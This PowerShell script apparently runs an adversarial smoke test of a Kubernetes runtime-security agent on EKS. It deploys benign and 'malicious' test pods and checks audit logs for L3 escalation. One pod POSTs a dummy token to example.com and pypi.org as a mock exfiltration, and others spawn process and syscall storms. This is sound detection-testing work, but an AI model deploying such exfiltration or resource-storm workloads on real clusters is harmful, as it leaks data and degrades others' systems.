param(
    [string]$ClusterName = "",

    [string]$KubeconfigPath = $env:RAASA_EKS_KUBECONFIG,

    [string]$Context = $env:RAASA_EKS_CONTEXT,

    [int]$Runs = 1,

    [int]$DurationSeconds = 45,

    [int]$ReadyTimeoutSeconds = 120,

    [switch]$QuiesceBackgroundWorkloads,

    [string]$Phase0ManifestPath = (Join-Path (Get-Location) "raasa\k8s\phase0-test-pods.yaml"),

    [string]$OutputDir = (Join-Path (Get-Location) ("AWS_Results_26_april\adversarial_smoke_eks_" + (Get-Date -Format "yyyy_MM_dd_HHmmss")))
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

function Invoke-NativeCapture {
    param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $true)]
        [string[]]$ArgumentList,

        [Parameter(Mandatory = $true)]
        [string]$ErrorContext,

        [int]$TimeoutSeconds = 300,

        [int[]]$AllowExitCodes = @(0)
    )

    $stdoutPath = Join-Path $env:TEMP ("raasa-stdout-" + [guid]::NewGuid().ToString() + ".txt")
    $stderrPath = Join-Path $env:TEMP ("raasa-stderr-" + [guid]::NewGuid().ToString() + ".txt")

    try {
        $process = Start-Process `
            -FilePath $FilePath `
            -ArgumentList $ArgumentList `
            -NoNewWindow `
            -PassThru `
            -RedirectStandardOutput $stdoutPath `
            -RedirectStandardError $stderrPath

        if (-not $process.WaitForExit($TimeoutSeconds * 1000)) {
            try { $process.Kill() } catch {}
            throw "$ErrorContext timed out after $TimeoutSeconds seconds."
        }

        $process.WaitForExit()
        $process.Refresh()
        $exitCode = [int]$process.ExitCode

        $output = @()
        if (Test-Path -LiteralPath $stdoutPath) { $output += Get-Content -LiteralPath $stdoutPath }
        if (Test-Path -LiteralPath $stderrPath) { $output += Get-Content -LiteralPath $stderrPath }

        if ($exitCode -notin $AllowExitCodes) {
            $joined = ($output -join [Environment]::NewLine).Trim()
            if ($joined) {
                throw "$ErrorContext failed with exit code $exitCode.`n$joined"
            }
            throw "$ErrorContext failed with exit code $exitCode."
        }

        return [pscustomobject]@{
            ExitCode = $exitCode
            Output = @($output)
        }
    }
    finally {
        Remove-Item -LiteralPath $stdoutPath, $stderrPath -Force -ErrorAction SilentlyContinue
    }
}

function Get-KubectlBaseArgs {
    $args = @()
    if (-not [string]::IsNullOrWhiteSpace($KubeconfigPath)) {
        $args += @("--kubeconfig", $KubeconfigPath)
    }
    if (-not [string]::IsNullOrWhiteSpace($Context)) {
        $args += @("--context", $Context)
    }
    return $args
}

function Invoke-KubectlCapture {
    param(
        [Parameter(Mandatory = $true)]
        [string[]]$KubectlArgs,

        [Parameter(Mandatory = $true)]
        [string]$ErrorContext,

        [int]$TimeoutSeconds = 300,

        [int[]]$AllowExitCodes = @(0)
    )

    return Invoke-NativeCapture `
        -FilePath "kubectl" `
        -ArgumentList ((Get-KubectlBaseArgs) + $KubectlArgs) `
        -ErrorContext $ErrorContext `
        -TimeoutSeconds $TimeoutSeconds `
        -AllowExitCodes $AllowExitCodes
}

function Save-KubectlOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string[]]$KubectlArgs,

        [Parameter(Mandatory = $true)]
        [string]$FileName,

        [int]$TimeoutSeconds = 180,

        [int[]]$AllowExitCodes = @(0)
    )

    $result = Invoke-KubectlCapture -KubectlArgs $KubectlArgs -ErrorContext ("kubectl " + ($KubectlArgs -join " ")) -TimeoutSeconds $TimeoutSeconds -AllowExitCodes $AllowExitCodes
    $result.Output | Set-Content -Path (Join-Path $OutputDir $FileName)
}

function Get-KubectlString {
    param(
        [Parameter(Mandatory = $true)]
        [string[]]$KubectlArgs,

        [int]$TimeoutSeconds = 120,

        [int[]]$AllowExitCodes = @(0)
    )

    return ((Invoke-KubectlCapture -KubectlArgs $KubectlArgs -ErrorContext ("kubectl " + ($KubectlArgs -join " ")) -TimeoutSeconds $TimeoutSeconds -AllowExitCodes $AllowExitCodes).Output -join "").Trim()
}

function Add-MapCount {
    param(
        [hashtable]$Map,
        [string]$Value
    )

    $key = if ([string]::IsNullOrWhiteSpace($Value)) { "missing" } else { $Value }
    if (-not $Map.ContainsKey($key)) {
        $Map[$key] = 0
    }
    $Map[$key] += 1
}

function Format-MapSummary {
    param([hashtable]$Map)

    if ($Map.Count -eq 0) {
        return "none"
    }

    return (($Map.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name):$($_.Value)" }) -join ",")
}

function Get-AgentPod {
    return (Get-KubectlString -KubectlArgs @("get", "pods", "-n", "raasa-system", "-l", "app=raasa-agent", "-o", "jsonpath={.items[0].metadata.name}"))
}

function Get-LatestAuditLog {
    param([Parameter(Mandatory = $true)][string]$AgentPod)

    return (Get-KubectlString -KubectlArgs @("exec", "-n", "raasa-system", $AgentPod, "-c", "raasa-agent", "--", "sh", "-c", "ls /app/raasa/logs/*.jsonl 2>/dev/null | tail -1") -AllowExitCodes @(0, 1))
}

function Get-AuditState {
    param([Parameter(Mandatory = $true)][string]$PodRef)

    $agentPod = Get-AgentPod
    $logFile = ""
    $countValue = 0
    if (-not [string]::IsNullOrWhiteSpace($agentPod)) {
        $logFile = Get-LatestAuditLog -AgentPod $agentPod
        if (-not [string]::IsNullOrWhiteSpace($logFile)) {
            $countText = Get-KubectlString -KubectlArgs @(
                "exec", "-n", "raasa-system", $agentPod, "-c", "raasa-agent", "--",
                "env", "TARGET_LOG=$logFile", "POD_REF=$PodRef", "sh", "-c", 'grep -F -c "$POD_REF" "$TARGET_LOG" 2>/dev/null || echo 0'
            ) -AllowExitCodes @(0, 1)
            $null = [int]::TryParse($countText, [ref]$countValue)
        }
    }

    return [pscustomobject]@{
        TimestampUtc = (Get-Date).ToUniversalTime().ToString("o")
        AgentPod = $agentPod
        LogFile = $logFile
        MatchingLineCount = $countValue
    }
}

function Get-AuditLines {
    param(
        [Parameter(Mandatory = $true)][string]$AgentPod,
        [Parameter(Mandatory = $true)][string]$LogFile,
        [Parameter(Mandatory = $true)][string]$PodRef
    )

    if ([string]::IsNullOrWhiteSpace($AgentPod) -or [string]::IsNullOrWhiteSpace($LogFile)) {
        return @()
    }

    $result = Invoke-KubectlCapture `
        -KubectlArgs @(
            "exec", "-n", "raasa-system", $AgentPod, "-c", "raasa-agent", "--",
            "env", "TARGET_LOG=$LogFile", "POD_REF=$PodRef", "sh", "-c", 'grep -F "$POD_REF" "$TARGET_LOG"'
        ) `
        -ErrorContext "Capture audit rows for $PodRef" `
        -TimeoutSeconds 180 `
        -AllowExitCodes @(0, 1)
    return @($result.Output)
}

function Get-AuditSummary {
    param([string]$Path)

    $newTiers = @{}
    $proposedTiers = @{}
    $telemetryStatuses = @{}
    $syscallStatuses = @{}
    $reasons = @{}
    $rows = 0
    $parseErrors = 0
    $maxCpu = 0.0
    $maxProcessSignal = 0.0
    $maxNetworkSignal = 0.0
    $maxSyscallSignal = 0.0

    if (Test-Path -LiteralPath $Path) {
        foreach ($line in Get-Content -LiteralPath $Path) {
            if ([string]::IsNullOrWhiteSpace($line)) {
                continue
            }

            try {
                $record = $line | ConvertFrom-Json
                $rows += 1
                Add-MapCount -Map $newTiers -Value ([string]$record.new_tier)
                Add-MapCount -Map $proposedTiers -Value ([string]$record.proposed_tier)
                Add-MapCount -Map $telemetryStatuses -Value ([string]$record.metadata.telemetry_status)
                Add-MapCount -Map $syscallStatuses -Value ([string]$record.metadata.syscall_status)
                Add-MapCount -Map $reasons -Value ([string]$record.reason)

                $cpuValue = if ($null -ne $record.cpu) { [double]$record.cpu } else { 0.0 }
                $processSignalValue = if ($null -ne $record.f_proc) { [double]$record.f_proc } else { 0.0 }
                $networkSignalValue = if ($null -ne $record.f_net) { [double]$record.f_net } else { 0.0 }
                $syscallSignalValue = if ($null -ne $record.f_sys) { [double]$record.f_sys } else { 0.0 }

                $maxCpu = [Math]::Max($maxCpu, $cpuValue)
                $maxProcessSignal = [Math]::Max($maxProcessSignal, $processSignalValue)
                $maxNetworkSignal = [Math]::Max($maxNetworkSignal, $networkSignalValue)
                $maxSyscallSignal = [Math]::Max($maxSyscallSignal, $syscallSignalValue)
            }
            catch {
                $parseErrors += 1
            }
        }
    }

    $l3Count = if ($newTiers.ContainsKey("L3")) { [int]$newTiers["L3"] } else { 0 }
    return [ordered]@{
        rows = $rows
        parse_errors = $parseErrors
        new_tiers = (Format-MapSummary -Map $newTiers)
        proposed_tiers = (Format-MapSummary -Map $proposedTiers)
        telemetry_statuses = (Format-MapSummary -Map $telemetryStatuses)
        syscall_statuses = (Format-MapSummary -Map $syscallStatuses)
        reasons = (Format-MapSummary -Map $reasons)
        max_cpu = [Math]::Round($maxCpu, 4)
        max_process_signal = [Math]::Round($maxProcessSignal, 4)
        max_network_signal = [Math]::Round($maxNetworkSignal, 4)
        max_syscall_signal = [Math]::Round($maxSyscallSignal, 4)
        l3_count = $l3Count
    }
}

if ($Runs -lt 1) {
    throw "Runs must be at least 1."
}
if ($DurationSeconds -lt 30) {
    throw "DurationSeconds must be at least 30."
}
if (-not (Get-Command kubectl -ErrorAction SilentlyContinue)) {
    throw "kubectl was not found on PATH."
}
if (-not [string]::IsNullOrWhiteSpace($KubeconfigPath) -and -not (Test-Path -LiteralPath $KubeconfigPath)) {
    throw "Kubeconfig path not found: $KubeconfigPath"
}
if ($QuiesceBackgroundWorkloads -and -not (Test-Path -LiteralPath $Phase0ManifestPath)) {
    throw "Phase0 manifest not found: $Phase0ManifestPath"
}

$workloads = @(
    [pscustomobject]@{
        Name = "benign-control"
        Namespace = "raasa-adv-control"
        PodRef = "raasa-adv-control/raasa-adv-benign-control"
        ExpectL3 = $false
        Manifest = @'
apiVersion: v1
kind: Namespace
metadata:
  name: raasa-adv-control
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-benign-control
  namespace: raasa-adv-control
  labels:
    app: raasa-adv
    raasa.matrix: benign-control
    raasa.class: benign
    raasa.expected_tier: L1
spec:
  containers:
    - name: workload
      image: busybox:1.36
      command: ["sh", "-c", "sleep infinity"]
      resources:
        requests:
          cpu: "10m"
          memory: "16Mi"
        limits:
          cpu: "100m"
          memory: "64Mi"
'@
    }
    [pscustomobject]@{
        Name = "syscall-storm"
        Namespace = "raasa-adv-sys"
        PodRef = "raasa-adv-sys/raasa-adv-syscall-storm"
        ExpectL3 = $true
        Manifest = @'
apiVersion: v1
kind: Namespace
metadata:
  name: raasa-adv-sys
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-syscall-storm
  namespace: raasa-adv-sys
  labels:
    app: raasa-adv
    raasa.matrix: syscall-storm
    raasa.class: malicious
    raasa.expected_tier: L3
spec:
  containers:
    - name: workload
      image: busybox:1.36
      command:
        - sh
        - -c
        - |
          while true; do
            pids=""
            i=0
            while [ "$i" -lt 28 ]; do
              sh -c 'while true; do cat /proc/stat >/dev/null 2>&1 || true; cat /proc/self/status >/dev/null 2>&1 || true; sleep 0.01; done' &
              pids="$pids $!"
              i=$((i + 1))
            done
            sleep 8
            kill $pids >/dev/null 2>&1 || true
            wait >/dev/null 2>&1 || true
          done
      resources:
        requests:
          cpu: "50m"
          memory: "32Mi"
        limits:
          cpu: "600m"
          memory: "128Mi"
'@
    }
    [pscustomobject]@{
        Name = "process-fanout"
        Namespace = "raasa-adv-proc"
        PodRef = "raasa-adv-proc/raasa-adv-process-fanout"
        ExpectL3 = $true
        Manifest = @'
apiVersion: v1
kind: Namespace
metadata:
  name: raasa-adv-proc
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-process-fanout
  namespace: raasa-adv-proc
  labels:
    app: raasa-adv
    raasa.matrix: process-fanout
    raasa.class: malicious
    raasa.expected_tier: L3
spec:
  containers:
    - name: workload
      image: busybox:1.36
      command:
        - sh
        - -c
        - |
          while true; do
            pids=""
            i=0
            while [ "$i" -lt 48 ]; do
              sh -c 'while :; do :; done' &
              pids="$pids $!"
              i=$((i + 1))
            done
            sleep 4
            kill $pids >/dev/null 2>&1 || true
            wait >/dev/null 2>&1 || true
            sleep 1
          done
      resources:
        requests:
          cpu: "50m"
          memory: "32Mi"
        limits:
          cpu: "800m"
          memory: "256Mi"
'@
    }
    [pscustomobject]@{
        Name = "network-burst"
        Namespace = "raasa-adv-net"
        PodRef = "raasa-adv-net/raasa-adv-net-client"
        ExpectL3 = $true
        Manifest = @'
apiVersion: v1
kind: Namespace
metadata:
  name: raasa-adv-net
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-net-server
  namespace: raasa-adv-net
  labels:
    app: raasa-adv-net-server
    raasa.matrix: network-burst
    raasa.class: benign
    raasa.expected_tier: L2
spec:
  containers:
    - name: server
      image: python:3.12-alpine
      command:
        - sh
        - -c
        - |
          dd if=/dev/zero of=/tmp/payload.bin bs=256K count=8 >/dev/null 2>&1
          cd /tmp
          python -m http.server 8080
      ports:
        - containerPort: 8080
      resources:
        requests:
          cpu: "30m"
          memory: "32Mi"
        limits:
          cpu: "300m"
          memory: "128Mi"
---
apiVersion: v1
kind: Service
metadata:
  name: raasa-adv-net-server
  namespace: raasa-adv-net
spec:
  selector:
    app: raasa-adv-net-server
  ports:
    - port: 8080
      targetPort: 8080
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-net-client
  namespace: raasa-adv-net
  labels:
    app: raasa-adv-net-client
    raasa.matrix: network-burst
    raasa.class: malicious
    raasa.expected_tier: L3
spec:
  containers:
    - name: client
      image: curlimages/curl:8.7.1
      command:
        - sh
        - -c
        - |
          while true; do
            i=0
            while [ "$i" -lt 40 ]; do
              curl -fsS http://raasa-adv-net-server.raasa-adv-net.svc.cluster.local:8080/payload.bin -o /dev/null || true
              i=$((i + 1))
            done
            sleep 1
          done
      resources:
        requests:
          cpu: "30m"
          memory: "32Mi"
        limits:
          cpu: "300m"
          memory: "128Mi"
'@
    }
    [pscustomobject]@{
        Name = "agent-dependency-exfiltration"
        Namespace = "raasa-adv-agent"
        PodRef = "raasa-adv-agent/raasa-adv-agent-dependency-exfiltration"
        ExpectL3 = $true
        Manifest = @'
apiVersion: v1
kind: Namespace
metadata:
  name: raasa-adv-agent
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-agent-dependency-exfiltration
  namespace: raasa-adv-agent
  labels:
    app: raasa-adv
    raasa.matrix: agent-dependency-exfiltration
    raasa.class: malicious
    raasa.expected_tier: L3
spec:
  containers:
    - name: workload
      image: python:3.12-alpine
      command:
        - sh
        - -c
        - |
          for i in 1 2 3 4 5 6 7 8; do sleep 300 & done
          python - <<'PY'
          import os
          import time
          import urllib.request

          targets = (
              "https://pypi.org/simple/pip/",
              "https://example.com/raasa-agent-benchmark",
          )
          token = "raasa-demo-token-not-a-secret"
          while True:
              for target in targets:
                  try:
                      request = urllib.request.Request(
                          target,
                          data=("token=" + token).encode(),
                          method="POST",
                      )
                      urllib.request.urlopen(request, timeout=2).read(64)
                  except Exception:
                      pass
              for _ in range(120000):
                  os.getpid()
              time.sleep(0.2)
          PY
      resources:
        requests:
          cpu: "50m"
          memory: "32Mi"
        limits:
          cpu: "700m"
          memory: "128Mi"
'@
    }
)

New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

$currentContext = Get-KubectlString -KubectlArgs @("config", "current-context")
if ([string]::IsNullOrWhiteSpace($ClusterName)) {
    $ClusterName = $currentContext
}

$summaryPath = Join-Path $OutputDir "summary.md"
$backgroundQuiesced = $false
$runRecords = @()

@(
    "# EKS Adversarial Smoke Summary",
    "",
    "- Cluster: $ClusterName",
    "- Context: $currentContext",
    "- Runs requested: $Runs",
    "- Duration seconds per workload: $DurationSeconds",
    "- Background workloads quiesced: $QuiesceBackgroundWorkloads",
    "- Collected at: $(Get-Date -Format o)",
    ""
) | Set-Content -Path $summaryPath

if ($QuiesceBackgroundWorkloads) {
    Save-KubectlOutput -KubectlArgs @("get", "pods", "-A", "-o", "wide") -FileName "background_before_quiesce.txt" -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
    Invoke-KubectlCapture -KubectlArgs @("delete", "pod", "-n", "default", "-l", "app=raasa-test", "--ignore-not-found", "--wait=true", "--timeout=120s") -ErrorContext "Delete phase-0 pods before EKS smoke" -TimeoutSeconds 180 -AllowExitCodes @(0, 1) | Out-Null
    $backgroundQuiesced = $true
}

for ($run = 1; $run -le $Runs; $run++) {
    $runLabel = "run_{0:D2}" -f $run
    $runDir = Join-Path $OutputDir $runLabel
    New-Item -ItemType Directory -Force -Path $runDir | Out-Null

    Save-KubectlOutput -KubectlArgs @("get", "nodes", "-o", "wide") -FileName (Join-Path $runLabel "nodes_before.txt") -TimeoutSeconds 120
    Save-KubectlOutput -KubectlArgs @("get", "pods", "-A", "-o", "wide") -FileName (Join-Path $runLabel "pods_before.txt") -TimeoutSeconds 120

    $results = @()
    foreach ($workload in $workloads) {
        $label = [string]$workload.Name
        $namespace = [string]$workload.Namespace
        $manifestPath = Join-Path $env:TEMP ("raasa-eks-adv-" + $label + "-" + [guid]::NewGuid().ToString() + ".yaml")

        try {
            $workload.Manifest | Set-Content -Path $manifestPath -NoNewline
            Invoke-KubectlCapture -KubectlArgs @("delete", "namespace", $namespace, "--ignore-not-found=true", "--wait=true", "--timeout=90s") -ErrorContext "Delete namespace $namespace before workload" -TimeoutSeconds 150 -AllowExitCodes @(0, 1) | Out-Null

            $auditStateBefore = Get-AuditState -PodRef $workload.PodRef
            (Invoke-KubectlCapture -KubectlArgs @("apply", "-f", $manifestPath) -ErrorContext "Apply workload manifest for $label" -TimeoutSeconds 180).Output | Set-Content -Path (Join-Path $runDir "${label}_apply.txt")
            (Invoke-KubectlCapture -KubectlArgs @("wait", "--for=condition=Ready", "pod", "-n", $namespace, "-l", "raasa.matrix=$label", "--timeout=${ReadyTimeoutSeconds}s") -ErrorContext "Wait for workload $label" -TimeoutSeconds ($ReadyTimeoutSeconds + 60) -AllowExitCodes @(0, 1)).Output | Set-Content -Path (Join-Path $runDir "${label}_wait_ready.txt")

            Start-Sleep -Seconds $DurationSeconds

            Save-KubectlOutput -KubectlArgs @("get", "pods", "-n", $namespace, "-o", "wide") -FileName (Join-Path $runLabel "${label}_pods.txt") -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
            Save-KubectlOutput -KubectlArgs @("top", "pods", "-n", $namespace) -FileName (Join-Path $runLabel "${label}_top_pods.txt") -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
            Save-KubectlOutput -KubectlArgs @("logs", "-n", "raasa-system", "-l", "app=raasa-agent", "--all-containers=true", "--tail=220") -FileName (Join-Path $runLabel "${label}_raasa_tail.txt") -TimeoutSeconds 180 -AllowExitCodes @(0, 1)

            $auditStateAfter = Get-AuditState -PodRef $workload.PodRef
            $allAuditLines = Get-AuditLines -AgentPod $auditStateAfter.AgentPod -LogFile $auditStateAfter.LogFile -PodRef $workload.PodRef
            $captureMode = "full_end_log"
            $deltaAuditLines = @($allAuditLines)
            if (
                $auditStateBefore.AgentPod -eq $auditStateAfter.AgentPod -and
                $auditStateBefore.LogFile -eq $auditStateAfter.LogFile -and
                $auditStateAfter.MatchingLineCount -ge $auditStateBefore.MatchingLineCount
            ) {
                $captureMode = "delta_from_same_log"
                $deltaAuditLines = @($allAuditLines | Select-Object -Skip $auditStateBefore.MatchingLineCount)
            }

            $auditRowsPath = Join-Path $runDir "${label}_audit_rows.jsonl"
            $auditMetaPath = Join-Path $runDir "${label}_audit_capture.json"
            $auditSummaryPath = Join-Path $runDir "${label}_audit_summary.json"
            $deltaAuditLines | Set-Content -Path $auditRowsPath

            [ordered]@{
                workload = $label
                pod_ref = $workload.PodRef
                capture_mode = $captureMode
                captured_line_count = @($deltaAuditLines).Count
                state_before = $auditStateBefore
                state_after = $auditStateAfter
            } | ConvertTo-Json -Depth 6 | Set-Content -Path $auditMetaPath

            $auditSummary = Get-AuditSummary -Path $auditRowsPath
            $auditSummary | ConvertTo-Json -Depth 6 | Set-Content -Path $auditSummaryPath

            $passed = if ([bool]$workload.ExpectL3) {
                $auditSummary.rows -gt 0 -and $auditSummary.l3_count -gt 0
            }
            else {
                $auditSummary.rows -gt 0 -and $auditSummary.l3_count -eq 0
            }

            $results += [pscustomobject]@{
                workload = $label
                passed = $passed
                rows = $auditSummary.rows
                l3_count = $auditSummary.l3_count
                new_tiers = $auditSummary.new_tiers
                telemetry_statuses = $auditSummary.telemetry_statuses
                syscall_statuses = $auditSummary.syscall_statuses
                max_cpu = $auditSummary.max_cpu
                max_process_signal = $auditSummary.max_process_signal
                max_network_signal = $auditSummary.max_network_signal
                max_syscall_signal = $auditSummary.max_syscall_signal
            }
        }
        finally {
            if (Test-Path -LiteralPath $manifestPath) {
                Remove-Item -LiteralPath $manifestPath -Force -ErrorAction SilentlyContinue
            }
            Invoke-KubectlCapture -KubectlArgs @("delete", "namespace", $namespace, "--ignore-not-found=true", "--wait=false") -ErrorContext "Delete namespace $namespace after workload" -TimeoutSeconds 120 -AllowExitCodes @(0, 1) | Out-Null
            Start-Sleep -Seconds 10
        }
    }

    $passCount = @($results | Where-Object { $_.passed }).Count
    $runPassed = ($passCount -eq $results.Count)
    $results | ConvertTo-Json -Depth 5 | Set-Content -Path (Join-Path $runDir "results.json")
    Save-KubectlOutput -KubectlArgs @("get", "nodes", "-o", "wide") -FileName (Join-Path $runLabel "nodes_after.txt") -TimeoutSeconds 120
    Save-KubectlOutput -KubectlArgs @("get", "pods", "-A", "-o", "wide") -FileName (Join-Path $runLabel "pods_after.txt") -TimeoutSeconds 120

    Add-Content -Path $summaryPath -Value "## $runLabel"
    Add-Content -Path $summaryPath -Value "- Result: $(if ($runPassed) { 'PASS' } else { 'FAIL' })"
    Add-Content -Path $summaryPath -Value "- Workloads passing: $passCount / $($results.Count)"
    foreach ($result in $results) {
        Add-Content -Path $summaryPath -Value "- $($result.workload): $(if ($result.passed) { 'PASS' } else { 'FAIL' }), L3 count $($result.l3_count), rows $($result.rows)"
    }
    Add-Content -Path $summaryPath -Value ""

    $runRecords += [pscustomobject]@{
        run = $run
        label = $runLabel
        passed = $runPassed
        workload_pass_count = $passCount
        workload_total = @($results).Count
        evidence_dir = $runDir
    }
}

if ($backgroundQuiesced) {
    Save-KubectlOutput -KubectlArgs @("apply", "-f", $Phase0ManifestPath) -FileName "background_restore.txt" -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
}

$passingRuns = @($runRecords | Where-Object { $_.passed }).Count
Add-Content -Path $summaryPath -Value "## Overall"
Add-Content -Path $summaryPath -Value "- Passing runs: $passingRuns / $Runs"

[ordered]@{
    cluster = $ClusterName
    context = $currentContext
    runs_requested = $Runs
    duration_seconds = $DurationSeconds
    passing_runs = $passingRuns
    run_records = $runRecords
} | ConvertTo-Json -Depth 6 | Set-Content -Path (Join-Path $OutputDir "results.json")

if ($passingRuns -ne $Runs) {
    throw "EKS adversarial smoke had failing run(s): $passingRuns / $Runs passed. Evidence: $OutputDir"
}

Write-Host "EKS adversarial smoke evidence collected in: $OutputDir"
